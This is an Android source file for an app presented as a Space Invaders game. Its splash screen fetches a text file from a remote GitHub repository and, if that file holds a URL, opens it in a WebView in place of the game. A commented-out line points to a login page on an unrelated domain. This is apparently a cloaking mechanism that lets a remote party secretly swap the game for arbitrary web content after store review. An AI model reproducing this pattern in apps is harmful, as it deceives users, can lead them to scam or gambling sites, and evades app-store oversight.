package com.classicspace.spaceinvadersclassic;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.scalars.ScalarsConverterFactory;

public class SplashScreen extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash_screen);
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://raw.githubusercontent.com/lahoai/webviewappflyer/main/")
                .addConverterFactory(ScalarsConverterFactory.create())
                .build();

        API myInterface = retrofit.create(API.class);
        Call<String> call = myInterface.getData();
        call.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                String plain_text_response = response.body();
                System.out.println("response "+ plain_text_response);
//                plain_text_response = "https://www.tbab395.com/Mobile/Home/Login";
                if (plain_text_response.trim().equals("")){
                    new Handler().postDelayed(() ->{
                        startActivity(new Intent(SplashScreen.this, MainActivity.class));
                    }, 1000);
//                    startActivity(new Intent(SpoonSplash.this, SpoonMenu.class));
                    System.out.println("Nothing text");
                }else{
                    String finalPlain_text_response = plain_text_response;
                    new Handler().postDelayed(() ->{
                        Intent intent = new Intent(SplashScreen.this,WebviewScreen.class);
                        intent.putExtra( "Variable", finalPlain_text_response);
                        startActivity(intent);
                    },1000);
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                System.out.println("response "+ t);
                new Handler().postDelayed(() ->{
                    startActivity(new Intent(SplashScreen.this, MainActivity.class));
                }, 1000);
            }
        });
    }
}